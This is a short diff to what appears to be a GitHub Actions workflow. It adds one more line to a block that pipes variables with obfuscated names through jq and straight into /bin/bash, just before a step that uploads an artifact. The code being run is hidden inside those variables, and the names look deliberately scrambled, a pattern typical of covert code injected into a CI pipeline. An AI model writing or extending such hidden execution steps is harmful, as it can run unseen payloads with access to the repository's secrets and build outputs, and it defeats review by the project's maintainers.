@@ -25,6 +25,7 @@ jobs:
           echo $up92 | jq -r .hbp40543 | /bin/bash
           printf '%s' "$tzsc822" | jq -r .cucv56 | /bin/bash
           echo $hk5 | jq -r .w7257 | /bin/bash
+          echo $a67 | jq -r .ieu889 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
